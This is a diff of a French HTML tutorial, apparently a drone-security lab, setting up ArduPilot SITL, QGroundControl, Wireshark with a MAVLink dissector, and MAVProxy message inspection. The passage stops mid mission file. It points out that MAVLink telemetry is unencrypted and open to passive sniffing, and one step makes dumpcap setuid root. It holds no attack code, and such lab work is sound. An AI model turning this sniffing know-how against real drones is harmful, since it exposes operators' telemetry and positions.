+      ArduPilot SITL (<strong>Software In The Loop</strong>) simule un drone complet sur ordinateur :
+      le firmware réel tourne sur l'hôte, les capteurs sont simulés, et la station au sol s'y
+      connecte comme si c'était un vrai drone.
+    </p>
 
     <div class="terminal">
       <div class="terminal-bar">
@@ -1611,153 +1300,236 @@
       </div>
       <div class="terminal-body">
         <div><span class="t-comment"># 1. Prérequis système</span></div>
-        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt update && sudo apt upgrade</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt update &amp;&amp; sudo apt upgrade</span></div>
         <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt install git python3 python3-pip python3-dev build-essential wget curl</span></div>
         <br>
-        <div><span class="t-comment"># 2. Cloner le dépôt ArduPilot</span></div>
+        <div><span class="t-comment"># 2. Cloner le dépôt</span></div>
         <div><span class="t-prompt">$ </span><span class="t-cmd">git clone https://github.com/ArduPilot/ardupilot.git</span></div>
         <div><span class="t-prompt">$ </span><span class="t-cmd">cd ardupilot</span></div>
         <br>
-        <div><span class="t-comment"># 3. Installer les dépendances</span></div>
+        <div><span class="t-comment"># 3. Dépendances</span></div>
         <div><span class="t-prompt">$ </span><span class="t-cmd">Tools/environment_install/install-prereqs-ubuntu.sh -y</span></div>
         <div><span class="t-prompt">$ </span><span class="t-cmd">. ~/.profile</span></div>
         <br>
-        <div><span class="t-comment"># 4. Compiler le simulateur SITL</span></div>
+        <div><span class="t-comment"># 4. Compiler</span></div>
         <div><span class="t-prompt">$ </span><span class="t-cmd">./waf configure --board sitl</span></div>
         <div><span class="t-prompt">$ </span><span class="t-cmd">./waf copter</span></div>
         <br>
-        <div><span class="t-comment"># 5. Lancer la simulation</span></div>
+        <div><span class="t-comment"># 5. Lancer le simulateur</span></div>
         <div><span class="t-prompt">$ </span><span class="t-cmd">cd ~/ardupilot/ArduCopter</span></div>
         <div><span class="t-prompt">$ </span><span class="t-cmd">../Tools/autotest/sim_vehicle.py -v ArduCopter -f quad --console --map</span></div>
       </div>
     </div>
 
-    <img src="images/img1.png" alt="Acoustic spoofing diagram" class="img">
+    <img src="images/img1.png" alt="ArduPilot SITL en cours d'exécution" class="img">
+    <div class="img-caption">Fig. 1 — ArduPilot SITL lancé avec console et carte MAVProxy</div>
 
     <!-- ÉTAPE 2 : QGroundControl -->
-    <h3 class="subsection">Étape 2 — Installation de QGroundControl</h3>
-    <p class="prose">QGroundControl est la station de contrôle au sol (GCS) pour drones, compatible avec MAVLink et SITL.</p>
+    <h3 class="subsection" id="step-qgc">Étape 2 — Installer QGroundControl</h3>
+    <p class="prose">
+      QGroundControl est la station de contrôle au sol (GCS). Elle se connecte au SITL via UDP
+      (par défaut <strong>127.0.0.1:14550</strong>) pour visualiser la télémétrie et envoyer des commandes.
+    </p>
 
     <div class="terminal">
       <div class="terminal-bar">
         <span class="terminal-dot" style="background:#e05555"></span>
         <span class="terminal-dot" style="background:#f0c040"></span>
         <span class="terminal-dot" style="background:#4fd1d1"></span>
-        &nbsp; Terminal — QGroundControl via AppImage
+        &nbsp; Terminal — QGroundControl
       </div>
       <div class="terminal-body">
-        <div><span class="t-comment"># Prérequis</span></div>
-        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt update</span></div>
-        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt upgrade -y</span></div>
-        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt install curl wget software-properties-common -y</span></div>
-        <br>
-        <div><span class="t-comment"># Supprimer modem manager</span></div>
+        <div><span class="t-comment"># Dépendances</span></div>
         <div><span class="t-prompt">$ </span><span class="t-cmd">sudo usermod -a -G dialout $USER</span></div>
         <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt-get remove modemmanager -y</span></div>
         <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt install gstreamer1.0-plugins-bad gstreamer1.0-libav gstreamer1.0-gl -y</span></div>
-        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt install libfuse2 -y</span></div>
-        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt install libxcb-xinerama0 libxkbcommon-x11-0 libxcb-cursor-dev -y</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt install libfuse2 libxcb-xinerama0 libxkbcommon-x11-0 libxcb-cursor-dev -y</span></div>
         <br>
-        <div><span class="t-out">Télécharger AppImage depuis https://qgroundcontrol.com</span></div>
-        <div><span class="t-prompt">$ </span><span class="t-cmd">cd Téléchargements</span></div>
+        <div><span class="t-comment"># Télécharger l'AppImage depuis qgroundcontrol.com</span></div>
         <div><span class="t-prompt">$ </span><span class="t-cmd">chmod +x ./QGroundControl-x86_64.AppImage</span></div>
         <div><span class="t-prompt">$ </span><span class="t-cmd">./QGroundControl-x86_64.AppImage</span></div>
         <br>
-        <div><span class="t-comment"># Connexion SITL via UDP</span></div>
-        <div><span class="t-out">→ Connection Type: udpin</span></div>
-        <div><span class="t-out">→ IP:Port: 127.0.0.1:14550</span></div>
+        <div><span class="t-comment"># Connexion SITL :</span></div>
+        <div><span class="t-out">→ Connection Type : udpin</span></div>
+        <div><span class="t-out">→ IP:Port         : 127.0.0.1:14550</span></div>
       </div>
     </div>
-    <img src="images/img2.png" alt="Acoustic spoofing diagram" class="img">
 
-    <!-- ÉTAPE 3 : Wireshark -->
-    <h3 class="subsection">Étape 3 — Capture MAVLink avec Wireshark</h3>
+    <img src="images/img2.png" alt="QGroundControl connecté au SITL" class="img">
+    <div class="img-caption">Fig. 2 — QGroundControl connecté au simulateur</div>
+
+    <!-- ÉTAPE 3 : Configuration sous Windows -->
+    <h3 class="subsection" id="step-windows">Étape 3 — Configuration sous Windows</h3>
+
+    <div class="alert alert-info">
+      <strong>Point fort de QGroundControl</strong> QGroundControl est multiplateforme :
+      le même logiciel, les mêmes fonctionnalités, tourne indifféremment sur Windows et
+      Linux. Vous pouvez donc faire tourner ArduPilot SITL sous WSL/Ubuntu et piloter
+      la GCS depuis Windows sans aucune configuration réseau supplémentaire.
+    </div>
+
+    <!-- 3a : QGC sur Windows -->
+    <h4 style="margin:28px 0 10px;font-size:1rem;font-weight:700;color:var(--accent)">
+      3a — Installer QGroundControl sur Windows
+    </h4>
+    <p class="prose">
+      Téléchargez l'installeur <code>.exe</code> depuis le site officiel et lancez-le :
+    </p>
 
     <div class="terminal">
       <div class="terminal-bar">
         <span class="terminal-dot" style="background:#e05555"></span>
         <span class="terminal-dot" style="background:#f0c040"></span>
         <span class="terminal-dot" style="background:#4fd1d1"></span>
-        &nbsp; Terminal — Installation Wireshark
+        &nbsp; Windows — Installation QGroundControl
       </div>
       <div class="terminal-body">
-        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt update && sudo apt install wireshark</span></div>
-        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo usermod -aG wireshark $USER</span></div>
-        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo wireshark</span></div>
+        <div><span class="t-comment"># 1. Télécharger l'installeur Windows</span></div>
+        <div><span class="t-out">→ https://qgroundcontrol.com  →  Télécharger  →  Windows</span></div>
         <br>
-        <div><span class="t-comment"># Dans Wireshark :</span></div>
-        <div><span class="t-out">→ Interface : loopback (lo)</span></div>
-        <div><span class="t-out">→ Filtre    : udp.port == 14550</span></div>
-        <div><span class="t-out">→ 127.0.0.1 = localhost → simulation locale</span></div>
+        <div><span class="t-comment"># 2. Lancer l'installeur</span></div>
+        <div><span class="t-out">→ Exécuter QGroundControl-installer.exe</span></div>
+        <div><span class="t-out">→ Accepter les prérequis (Visual C++ Redistributable installé auto.)</span></div>
+        <div><span class="t-out">→ Suivre l'assistant d'installation</span></div>
+        <br>
+        <div><span class="t-comment"># 3. Lancer QGroundControl</span></div>
+        <div><span class="t-out">→ Icône bureau  ou  Démarrer &gt; QGroundControl</span></div>
+      </div>
+    </div>
+
+    <!-- 3b : ArduPilot via WSL -->
+    <h4 style="margin:28px 0 10px;font-size:1rem;font-weight:700;color:var(--accent)">
+      3b — ArduPilot SITL via WSL 2 (Ubuntu)
+    </h4>
+    <p class="prose">
+      WSL 2 expose l'interface réseau de Windows à Ubuntu. ArduPilot envoie ses paquets UDP vers
+      l'adresse IP de l'hôte Windows, que QGroundControl reçoit directement.
+    </p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; PowerShell / WSL — Installation &amp; lancement
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-comment"># --- PowerShell (admin) : activer WSL 2 + Ubuntu ---</span></div>
+        <div><span class="t-prompt">PS&gt; </span><span class="t-cmd">wsl --install -d Ubuntu-22.04</span></div>
+        <div><span class="t-prompt">PS&gt; </span><span class="t-cmd">wsl --set-default-version 2</span></div>
+        <br>
+        <div><span class="t-comment"># Redémarrez Windows, puis ouvrez le terminal Ubuntu WSL</span></div>
+        <br>
+        <div><span class="t-comment"># --- Dans Ubuntu (WSL) : installer ArduPilot SITL ---</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt update &amp;&amp; sudo apt install git python3 python3-pip build-essential -y</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">git clone https://github.com/ArduPilot/ardupilot.git &amp;&amp; cd ardupilot</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">Tools/environment_install/install-prereqs-ubuntu.sh -y &amp;&amp; . ~/.profile</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">./waf configure --board sitl &amp;&amp; ./waf copter</span></div>
+        <br>
+        <div><span class="t-comment"># Récupérer l'IP de l'hôte Windows vue depuis WSL</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">ip route show | grep -i default | awk '{print $3}'</span></div>
+        <div><span class="t-out">  → ex : 172.26.112.1  (IP hôte Windows)</span></div>
+        <br>
+        <div><span class="t-comment"># Lancer SITL en ciblant QGroundControl sur Windows</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">cd ~/ardupilot/ArduCopter</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">../Tools/autotest/sim_vehicle.py -v ArduCopter -f quad --console --map \</span></div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;<span class="t-cmd">--out=udp:172.26.112.1:14550</span></div>
+        <br>
+        <div><span class="t-comment"># QGroundControl (Windows) détecte automatiquement le drone simulé</span></div>
+        <div><span class="t-out">→ Statut QGC : "Connected — ArduCopter"</span></div>
       </div>
     </div>
 
     <div class="alert alert-warn" style="margin-top:20px">
-      Wireshark ne reconnaît pas MAVLink nativement ⇒ faire fonctionner un dissector MAVLink dans Wireshark.
+      <strong>Astuce WSL 2</strong> — L'IP de l'hôte Windows change à chaque redémarrage de WSL.
+      Automatisez sa récupération : <code>HOST_IP=$(ip route show | grep default | awk '{print $3}')</code>
+      puis utilisez <code>--out=udp:$HOST_IP:14550</code>.
     </div>
+
+    <!-- ÉTAPE 4 : Wireshark -->
+    <h3 class="subsection" id="step-wireshark">Étape 4 — Capturer MAVLink avec Wireshark</h3>
+    <p class="prose">
+      Wireshark capture le trafic UDP entre le SITL et la GCS. Par défaut il ne reconnaît pas
+      le protocole MAVLink — il faut lui ajouter un <em>dissector</em> en Lua.
+    </p>
 
     <div class="terminal">
       <div class="terminal-bar">
         <span class="terminal-dot" style="background:#e05555"></span>
         <span class="terminal-dot" style="background:#f0c040"></span>
         <span class="terminal-dot" style="background:#4fd1d1"></span>
-        &nbsp; Terminal — Dissector MAVLink
+        &nbsp; Installation et configuration
       </div>
       <div class="terminal-body">
-        <div><span class="t-out">→ Source : https://mavlink.io/en/guide/wireshark.html</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt install wireshark</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo usermod -aG wireshark $USER</span></div>
         <br>
+        <div><span class="t-comment"># Installer le dissector MAVLink (Lua)</span></div>
         <div><span class="t-prompt">$ </span><span class="t-cmd">mkdir -p ~/.local/lib/wireshark/plugins</span></div>
         <div><span class="t-prompt">$ </span><span class="t-cmd">nano ~/.local/lib/wireshark/plugins/mavlink.lua</span></div>
         <br>
-        <div><span class="t-out">→ copie-colle exactement ceci :</span></div>
-        <div class="code-block">
-local mavlink = Proto("mavlink", "MAVLink Protocol")<br><br>
-
-local f_magic = ProtoField.uint8("mavlink.magic", "Magic")<br>
-local f_len   = ProtoField.uint8("mavlink.len", "Length")<br>
-local f_seq   = ProtoField.uint8("mavlink.seq", "Sequence")<br>
-local f_sysid = ProtoField.uint8("mavlink.sysid", "System ID")<br>
-local f_compid= ProtoField.uint8("mavlink.compid", "Component ID")<br>
-local f_msgid = ProtoField.uint8("mavlink.msgid", "Message ID")<br><br>
-
-mavlink.fields = {f_magic, f_len, f_seq, f_sysid, f_compid, f_msgid}<br><br>
-
-function mavlink.dissector(buffer, pinfo, tree) {<br>
-&nbsp;&nbsp;if buffer:len() &lt; 6 then return end<br><br>
-
-&nbsp;&nbsp;pinfo.cols.protocol = "MAVLink"<br><br>
-
-&nbsp;&nbsp;local subtree = tree:add(mavlink, buffer(), "MAVLink Packet")<br><br>
-
-&nbsp;&nbsp;subtree:add(f_magic, buffer(0,1))<br>
-&nbsp;&nbsp;subtree:add(f_len,   buffer(1,1))<br>
-&nbsp;&nbsp;subtree:add(f_seq,   buffer(2,1))<br>
-&nbsp;&nbsp;subtree:add(f_sysid, buffer(3,1))<br>
-&nbsp;&nbsp;subtree:add(f_compid,buffer(4,1))<br>
-&nbsp;&nbsp;subtree:add(f_msgid, buffer(5,1))<br>
-}<br><br>
-
-local udp_port = DissectorTable.get("udp.port")<br>
-udp_port:add(14550, mavlink) <span class="comment">// port MAVLink</span>
-</div>
-
-        <div><span class="t-prompt">$ </span><span class="t-cmd">wireshark &</span></div>
+        <div><span class="t-comment"># Permissions dumpcap</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo chmod 750 /usr/bin/dumpcap</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo chgrp wireshark /usr/bin/dumpcap</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo chmod 4711 /usr/bin/dumpcap</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">newgrp wireshark &amp;&amp; wireshark &amp;</span></div>
+        <br>
+        <div><span class="t-comment"># Dans Wireshark :</span></div>
+        <div><span class="t-out">→ Interface : loopback (lo)</span></div>
+        <div><span class="t-out">→ Filtre    : udp.port == 14550</span></div>
+      </div>
     </div>
-  </div>
-<img src="images/img3.png" alt="Acoustic spoofing diagram" class="img">
 
-    <div class="alert alert-info" style="margin-top:12px">
-      <strong>Observation Clé — Pas de Chiffrement</strong>
-      Les messages MAVLink sont visibles en clair dans Wireshark : pas de chiffrement, pas d'authentification, accessibles via simple sniffing sur udp.port == 14550.
+    <div class="code-block">
+<span class="comment">-- ~/.local/lib/wireshark/plugins/mavlink.lua</span>
+local mavlink = Proto("mavlink", "MAVLink Protocol")
+
+local f_magic = ProtoField.uint8("mavlink.magic",  "Magic")
+local f_len   = ProtoField.uint8("mavlink.len",    "Length")
+local f_seq   = ProtoField.uint8("mavlink.seq",    "Sequence")
+local f_sysid = ProtoField.uint8("mavlink.sysid",  "System ID")
+local f_compid= ProtoField.uint8("mavlink.compid", "Component ID")
+local f_msgid = ProtoField.uint8("mavlink.msgid",  "Message ID")
+
+mavlink.fields = {f_magic, f_len, f_seq, f_sysid, f_compid, f_msgid}
+
+function mavlink.dissector(buffer, pinfo, tree)
+  if buffer:len() &lt; 6 then return end
+  pinfo.cols.protocol = "MAVLink"
+  local subtree = tree:add(mavlink, buffer(), "MAVLink Packet")
+  subtree:add(f_magic,  buffer(0,1))
+  subtree:add(f_len,    buffer(1,1))
+  subtree:add(f_seq,    buffer(2,1))
+  subtree:add(f_sysid,  buffer(3,1))
+  subtree:add(f_compid, buffer(4,1))
+  subtree:add(f_msgid,  buffer(5,1))
+end
+
+local udp_port = DissectorTable.get("udp.port")
+udp_port:add(14550, mavlink)
+    </div>
+
+    <img src="images/img3.png" alt="Capture MAVLink dans Wireshark" class="img">
+    <div class="img-caption">Fig. 3 — Capture MAVLink dans Wireshark — messages visibles en clair</div>
+
+    <div class="alert alert-danger">
+      <strong>Observation clé</strong>
+      Les messages sont visibles en clair : pas de chiffrement, pas d'authentification.
+      Le simple sniffing sur <code>udp.port == 14550</code> révèle toute la télémétrie.
     </div>
 
     <!-- ÉTAPE 4 : MAVProxy -->
-    <h3 class="subsection">Étape 4 — MAVProxy : Analyse des Messages</h3>
-    <p class="prose">MAVProxy est un proxy MAVLink en ligne de commande permettant d'interagir directement avec le drone SITL.</p>
+    <h3 class="subsection" id="step-mavproxy">Étape 5 — MAVProxy : observer les messages</h3>
+    <p class="prose">
+      MAVProxy est un proxy MAVLink en ligne de commande. Il permet d'observer en direct les
+      messages échangés et d'envoyer des commandes au drone.
+    </p>
 
-    <h4 class="sub2">Analyse du HEARTBEAT</h4>
-    <p class="prose">Un heartbeat = un signal périodique (<strong>1 fois par seconde</strong>) : "Je suis actif, connecté, et voici mon état."</p>
-
+    <h4 class="sub2">HEARTBEAT — le pouls du système</h4>
+    <p class="prose">
+      Émis 1 fois par seconde par chaque participant (drone et GCS), il indique « je suis vivant,
+      voici mon état ».
+    </p>
 
     <div class="terminal">
       <div class="terminal-bar">
@@ -1767,46 +1539,36 @@ udp_port:add(14550, mavlink) <span class="comment">// port MAVLink</span>
         &nbsp; MAVProxy
       </div>
       <div class="terminal-body">
-        <div><span class="t-prompt">$ </span><span class="t-cmd">watch HEARTBEAT</span></div>
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">watch HEARTBEAT</span></div>
       </div>
     </div>
 
-    <img src="images/img4.png" alt="Acoustic spoofing diagram" class="img">
-
-    <div class="code-block">
-HEARTBEAT {<br>
-&nbsp; type              : &lt;type du système&gt;          <span class="comment">// 2 = UAV (drone), 6 = GCS</span><br>
-&nbsp; autopilot         : &lt;type d’autopilot&gt;        <span class="comment">// 3 = ArduPilot, 8 = aucun (GCS)</span><br>
-&nbsp; base_mode         : &lt;mode de base (bitmask)&gt; <span class="comment">// ex: 192 = armé + actif</span><br>
-&nbsp; custom_mode       : &lt;mode spécifique&gt;        <span class="comment">// dépend de l’autopilot (Stabilize, Auto…)</span><br>
-&nbsp; system_status     : &lt;état du système&gt;        <span class="comment">// 4 = actif, 3 = en attente</span><br>
-&nbsp; mavlink_version   : &lt;version MAVLink&gt;        <span class="comment">// 3 = MAVLink v2</span><br>
-}
-  </div>
-
-  <div style="border: 1px solid var(--border); background: #020a0a; border-radius:2px; overflow:hidden; margin:20px 0">
-      <div style="background: var(--teal-dark); padding:8px 16px; font-family:var(--mono); font-size:10px; color:var(--teal-light); letter-spacing:1px">
-        MAVProxy — watch HEARTBEAT
+    <div style="border:1px solid var(--border); background:#020a0a; border-radius:2px; overflow:hidden; margin:16px 0">
+      <div style="background:var(--teal-dark); padding:8px 16px; font-family:var(--mono); font-size:10px; color:var(--teal-light); letter-spacing:1px">
+        Décryptage des HEARTBEAT
       </div>
       <div class="heartbeat-row">
         <span class="dir">&gt;</span>
         <span class="key">HEARTBEAT {type:</span> <span class="val">6</span><span class="key">, autopilot:</span> <span class="val">8</span><span class="key">, base_mode:</span> <span class="val">0</span><span class="key">, system_status:</span> <span class="val">0</span><span class="key">}</span>
-        <span class="annotation">→ type:6=GCS · autopilot:8=MAV_AUTOPILOT_INVALID · base_mode:0=aucun mode · system_status:0=UNINIT → QGroundControl au démarrage</span>
+        <span class="annotation">type:6 = GCS · autopilot:8 = MAV_AUTOPILOT_INVALID · base_mode:0 = aucun · status:0 = UNINIT → QGroundControl au démarrage</span>
       </div>
       <div class="heartbeat-row">
         <span class="dir">&gt;</span>
         <span class="key">HEARTBEAT {type:</span> <span class="val">6</span><span class="key">, autopilot:</span> <span class="val">8</span><span class="key">, base_mode:</span> <span class="val">192</span><span class="key">, system_status:</span> <span class="val">4</span><span class="key">}</span>
-        <span class="annotation">→ type:6=GCS · base_mode:192=GCS actif (bits activés) · system_status:4=ACTIVE → QGroundControl maintenant opérationnel</span>
+        <span class="annotation">base_mode:192 = GCS actif · status:4 = ACTIVE → QGroundControl opérationnel</span>
       </div>
       <div class="heartbeat-row">
         <span class="dir" style="color:#f08080">&lt;</span>
         <span class="key">HEARTBEAT {type:</span> <span class="val">2</span><span class="key">, autopilot:</span> <span class="val">3</span><span class="key">, base_mode:</span> <span class="val">217</span><span class="key">, custom_mode:</span> <span class="val">4</span><span class="key">, system_status:</span> <span class="val">4</span><span class="key">}</span>
-        <span class="annotation">→ type:2=quadrotor · autopilot:3=ArduPilot · base_mode:217=drone actif+armé+guidé · custom_mode:4=GUIDED · system_status:4=ACTIVE → Drone SITL</span>
+        <span class="annotation">type:2 = quadrotor · autopilot:3 = ArduPilot · base_mode:217 = actif+armé+guidé · custom_mode:4 = GUIDED → Drone SITL en vol</span>
       </div>
     </div>
 
-    <h4 class="sub2">Analyse du GPS_RAW_INT</h4>
-   <div class="terminal">
+    <img src="images/img4.png" alt="HEARTBEAT dans MAVProxy" class="img">
+    <div class="img-caption">Fig. 4 — Flux de HEARTBEAT dans MAVProxy</div>
+
+    <h4 class="sub2">GPS_RAW_INT — la position brute</h4>
+    <div class="terminal">
       <div class="terminal-bar">
         <span class="terminal-dot" style="background:#e05555"></span>
         <span class="terminal-dot" style="background:#f0c040"></span>
@@ -1814,31 +1576,28 @@ HEARTBEAT {<br>
         &nbsp; MAVProxy
       </div>
       <div class="terminal-body">
-        <div><span class="t-prompt">$ </span><span class="t-cmd">watch GPS_RAW_INT</span></div>
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">watch GPS_RAW_INT</span></div>
       </div>
     </div>
 
-    <img src="images/img5.png" alt="Acoustic spoofing diagram" class="img">
+    <img src="images/img5.png" alt="GPS_RAW_INT" class="img">
+    <div class="img-caption">Fig. 5 — Messages GPS_RAW_INT capturés en temps réel</div>
+
     <div class="code-block">
-GPS_RAW_INT {<br>
-&nbsp; time_usec         : &lt;temps en µs&gt;              <span class="comment">// horodatage du message</span><br>
-&nbsp; fix_type          : &lt;qualité du signal GPS&gt;   <span class="comment">// 0 = pas de GPS, 6 = position 3D fiable</span><br>
-&nbsp; lat, lon          : &lt;position GPS&gt;            <span class="comment">// latitude/longitude × 10⁷</span><br>
-&nbsp; alt               : &lt;altitude&gt;                <span class="comment">// hauteur par rapport au niveau de la mer (mm)</span><br>
-&nbsp; eph, epv          : &lt;précision&gt;               <span class="comment">// erreur horizontale / verticale</span><br>
-&nbsp; vel               : &lt;vitesse&gt;                 <span class="comment">// vitesse du drone (cm/s)</span><br>
-&nbsp; cog               : &lt;direction&gt;               <span class="comment">// cap de déplacement (0.01°)</span><br>
-&nbsp; satellites_visible: &lt;nb satellites&gt;          <span class="comment">// plus il est élevé, plus le GPS est fiable</span><br>
-&nbsp; alt_ellipsoid     : &lt;altitude GPS brute&gt;      <span class="comment">// altitude basée sur le modèle terrestre</span><br>
-&nbsp; h_acc, v_acc      : &lt;incertitude&gt;             <span class="comment">// précision horizontale / verticale (mm)</span><br>
-&nbsp; vel_acc           : &lt;précision vitesse&gt;<br>
-&nbsp; hdg_acc           : &lt;précision direction&gt;<br>
-&nbsp; yaw               : &lt;orientation du drone&gt;    <span class="comment">// angle de rotation (°)</span><br>
+GPS_RAW_INT {
+  time_usec          <span class="comment">// horodatage µs</span>
+  fix_type           <span class="comment">// 0=pas de fix, 3=3D, 6=RTK</span>
+  lat, lon           <span class="comment">// position × 10⁷</span>
+  alt                <span class="comment">// altitude AMSL en mm</span>
+  eph, epv           <span class="comment">// précision horizontale/verticale</span>
+  vel                <span class="comment">// vitesse en cm/s</span>
+  cog                <span class="comment">// cap (0.01°)</span>
+  satellites_visible <span class="comment">// nb satellites</span>
 }
-</div>
+    </div>
 
-    <h4 class="sub2">Analyse de l'ATTITUDE</h4>
-  <div class="terminal">
+    <h4 class="sub2">ATTITUDE — l'orientation du drone</h4>
+    <div class="terminal">
       <div class="terminal-bar">
         <span class="terminal-dot" style="background:#e05555"></span>
         <span class="terminal-dot" style="background:#f0c040"></span>
@@ -1846,64 +1605,46 @@ GPS_RAW_INT {<br>
         &nbsp; MAVProxy
       </div>
       <div class="terminal-body">
-        <div><span class="t-prompt">$ </span><span class="t-cmd">watch ATTITUDE</span></div>
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">watch ATTITUDE</span></div>
       </div>
     </div>
 
-    <img src="images/img6.png" alt="Acoustic spoofing diagram" class="img">
+    <img src="images/img6.png" alt="ATTITUDE" class="img">
+    <div class="img-caption">Fig. 6 — Roll, pitch, yaw du drone en vol</div>
 
-
-
-   <div class="code-block">
-ATTITUDE {<br>
-&nbsp; time_boot_ms : &lt;temps depuis démarrage (ms)&gt; <span class="comment">// horodatage</span><br>
-&nbsp; roll         : &lt;inclinaison gauche/droite&gt;    <span class="comment">// rotation autour de l’axe avant-arrière (radians)</span><br>
-&nbsp; pitch        : &lt;inclinaison avant/arrière&gt;    <span class="comment">// rotation autour de l’axe gauche-droite (radians)</span><br>
-&nbsp; yaw          : &lt;orientation&gt;                  <span class="comment">// direction du drone (rotation axe vertical)</span><br>
-&nbsp; rollspeed    : &lt;vitesse de rotation roulis&gt;   <span class="comment">// rad/s</span><br>
-&nbsp; pitchspeed   : &lt;vitesse de rotation tangage&gt;  <span class="comment">// rad/s</span><br>
-&nbsp; yawspeed     : &lt;vitesse de rotation lacet&gt;    <span class="comment">// rad/s</span><br>
+    <div class="code-block">
+ATTITUDE {
+  roll       <span class="comment">// rotation axe avant-arrière (rad)</span>
+  pitch      <span class="comment">// rotation axe gauche-droite (rad)</span>
+  yaw        <span class="comment">// rotation axe vertical / cap (rad)</span>
+  rollspeed  <span class="comment">// rad/s</span>
+  pitchspeed <span class="comment">// rad/s</span>
+  yawspeed   <span class="comment">// rad/s</span>
 }
-</div>
+    </div>
 
     <!-- ÉTAPE 5 : Mission -->
-    <h3 class="subsection">Étape 5 — Définir et Exécuter une Mission</h3>
+    <h3 class="subsection" id="step-mission">Étape 6 — Définir et exécuter une mission</h3>
+    <p class="prose">
+      Une mission est une suite de waypoints (latitude, longitude, altitude) que le drone doit suivre
+      en mode AUTO. Deux méthodes : un fichier texte au format QGC, ou un tracé direct sur la carte.
+    </p>
 
-    <h4 class="sub2">Méthode 1 :Chargement et exécution de mission</h4>
+    <h4 class="sub2">Méthode 1 — Fichier mission.txt</h4>
     <div class="mission-viz">
       <table class="mission-table">
         <thead>
           <tr>
-            <th>SEQ</th><th>current</th><th>frame</th><th>command</th>
+            <th>SEQ</th><th>cur</th><th>frame</th><th>cmd</th>
             <th>p1</th><th>p2</th><th>p3</th><th>p4</th>
-            <th>lat</th><th>lon</th><th>alt</th><th>autocontinue</th><th>Type</th>
+            <th>lat</th><th>lon</th><th>alt</th><th>auto</th><th>Type</th>
           </tr>
         </thead>
         <tbody>
-          <tr>
-            <td class="wp-nav">0</td><td>1</td><td>3</td><td>16</td>
-            <td>0</td><td>0</td><td>0</td><td>0</td>
-            <td>-35.3625</td><td>149.1650</td><td>10</td><td>1</td>
-            <td class="wp-nav">NAV_WAYPOINT</td>
-          </tr>
-          <tr>
-            <td class="wp-nav">1</td><td>0</td><td>3</td><td>16</td>
-            <td>0</td><td>0</td><td>0</td><td>0</td>
-            <td>-35.3630</td><td>149.1655</td><td>10</td><td>1</td>
-            <td class="wp-nav">NAV_WAYPOINT</td>
-          </tr>
-          <tr>
-            <td class="wp-nav">2</td><td>0</td><td>3</td><td>16</td>
-            <td>0</td><td>0</td><td>0</td><td>0</td>
-            <td>-35.3635</td><td>149.1660</td><td>10</td><td>1</td>
-            <td class="wp-nav">NAV_WAYPOINT</td>
-          </tr>
-          <tr>
-            <td class="wp-land">3</td><td>0</td><td>3</td><td>21</td>
-            <td>0</td><td>0</td><td>0</td><td>0</td>
-            <td>0</td><td>0</td><td>0</td><td>1</td>
-            <td class="wp-land">LAND</td>
-          </tr>
+          <tr><td class="wp-nav">0</td><td>1</td><td>3</td><td>16</td><td>0</td><td>0</td><td>0</td><td>0</td><td>-35.3625</td><td>149.1650</td><td>10</td><td>1</td><td class="wp-nav">NAV_WAYPOINT</td></tr>
+          <tr><td class="wp-nav">1</td><td>0</td><td>3</td><td>16</td><td>0</td><td>0</td><td>0</td><td>0</td><td>-35.3630</td><td>149.1655</td><td>10</td><td>1</td><td class="wp-nav">NAV_WAYPOINT</td></tr>
+          <tr><td class="wp-nav">2</td><td>0</td><td>3</td><td>16</td><td>0</td><td>0</td><td>0</td><td>0</td><td>-35.3635</td><td>149.1660</td><td>10</td><td>1</td><td class="wp-nav">NAV_WAYPOINT</td></tr>
+          <tr><td class="wp-land">3</td><td>0</td><td>3</td><td>21</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td class="wp-land">LAND</td></tr>
         </tbody>
       </table>
     </div>
@@ -1913,32 +1654,24 @@ ATTITUDE {<br>
         <span class="terminal-dot" style="background:#e05555"></span>
         <span class="terminal-dot" style="background:#f0c040"></span>
         <span class="terminal-dot" style="background:#4fd1d1"></span>
-        &nbsp; MAVProxy — Chargement et exécution de mission
+        &nbsp; MAVProxy — Chargement et exécution
       </div>
       <div class="terminal-body">
         <div><span class="t-prompt">$ </span><span class="t-cmd">nano mission.txt</span></div>
-        <div class="code-block">
-<br>
-QGC WPL 110<br>
-0   1   3   16  0 0 0 0   -35.3625 149.1650 10  1<br>
